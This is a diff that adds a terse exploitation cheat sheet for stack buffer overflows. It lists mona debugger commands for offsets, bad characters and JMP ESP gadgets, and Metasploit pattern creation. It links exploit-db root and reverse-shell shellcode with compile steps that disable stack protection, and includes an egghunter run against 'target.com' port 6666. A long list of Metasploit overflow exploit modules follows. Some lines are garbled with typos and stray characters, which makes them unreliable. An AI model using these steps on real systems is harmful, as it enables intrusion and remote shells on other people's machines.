@@ -1,0 +1,85 @@
+
+!mona po EIP
+!mona jmp -r esp -m kernel
+!mona modeuls
+!mona jmp esp
+#look for: found in cyclic pattern at position 
+
+cd /opt/metasploit-framework/embedded/framework/tools/exploit
+ruby pattern_create.rb -l 62
+
+!mona findmsp -distance leg
+!mona findmsp -distance 201
+!mona bytearray -b "\x00\x0a"
+!mona compare -f C:\wordshop\bytearray.bin -a esp
+!mona jmp -r esp -cpd "\x00\x0a"
+
+ 
+
+[LocalRoot]Linux/x86 - execve /bin/sh Shellcode (fstenv eip GetPC technique):https://www.exploit-db.com/download/49976
+#Usage: gcc -fno-stack-protector -z execstack -o x0r00t x0rDownload.c
+#Usage: ./x0r00t
+
+python - Buffer overFlow exploit - target - evil http
+[Reverse TCP Shellcode]Linux/x86 - Egghunter dynamic IP and port:https://www.exploit-db.com/download/50141
+gcc -fno-stack-protector -z execstack -o egghunter egghunter_shellcode.c+
+./egghunter 2 3d7xC0D3 target.com 6666 
+
+
+exploit/multi/browser/adobe_flash_nellymoser_bof
+exploit/multi/browser/adobe_flash_pixel_bender_bof
+exploit/multi/browser/adobe_flash_shader_job_overflow
+exploit/multi/fileformat/adobe_u3d_meshcont
+exploit/linux/http/airties_login_cgi_bof
+exploit/android/browser/stagefright_mp4_tx3g_64bit
+exploit/linux/http/belkin_login_bof
+exploit/linux/misc/ib_inet_connect
+exploit/linux/misc/ib_pwd_db_aliased
+exploit/linux/misc/ib_jrd8_create_database
+exploit/linux/misc/ib_open_marker_file
+exploit/linux/pop3/cyrus_pop3d_popsubfolders
+exploit/linux/http/dlink_dir605l_captcha_bof
+exploit/linux/http/dlink_hnap_bof
+exploit/linux/http/dlink_authentication_cgi_bof
+exploit/linux/http/dlink_hedwig_cgi_bof
+exploit/linux/http/dlink_dspw215_info_cgi_bof
+exploit/linux/http/dlink_hnap_login_bof
+exploit/linux/misc/gld_postfix
+exploit/linux/http/geutebruck_instantrec_bof
+exploit/multi/browser/chrome_simplifiedlowering_overflow
+exploit/linux/misc/hp_vsa_login_bof
+exploit/linux/local/hp_smhstart
+exploit/linux/misc/hikvision_rtsp_bof
+exploit/linux/http/linksys_apply_cgi
+exploit/linux/telnet/telnet_encrypt_keyid
+exploit/linux/upnp/miniupnpd_soap_bof
+exploit/linux/mysql/mysql_yassl_getname
+exploit/linux/mysql/mysql_yassl_hello
+exploit/multi/ntp/ntp_overflow
+exploit/linux/misc/netsupport_manager_agent
+exploit/linux/misc/novell_edirectory_ncp_bof
+exploit/multi/php/php_unserialize_zval_cookie
+exploit/linux/http/peercast_url
+exploit/linux/pptp/poptop_negative_read
+exploit/linux/ftp/proftp_sreplace
+exploit/linux/ftp/proftp_telnet_iac
+exploit/multi/realserver/describe
+exploit/multi/samba/nttrans
+exploit/linux/samba/setinfopolicy_heap
+exploit/linux/samba/lsa_transnames_heap
+exploit/linux/samba/trans2open
+exploit/multi/ids/snort_dce_rpc
+exploit/linux/ids/snortbopre
+exploit/linux/proxy/squid_ntlm_authenticate
+exploit/multi/svn/svnserve_date
+exploit/linux/local/sudo_baron_samedit
+exploit/multi/vpn/tincd_bof
+exploit/linux/games/ut_secure
+exploit/linux/imap/imap_uw_lsub
+exploit/multi/misc/wireshark_lwres_getaddrbyname
+exploit/multi/misc/wireshark_lwres_getaddrbyname_loop
+
+
+
+
+
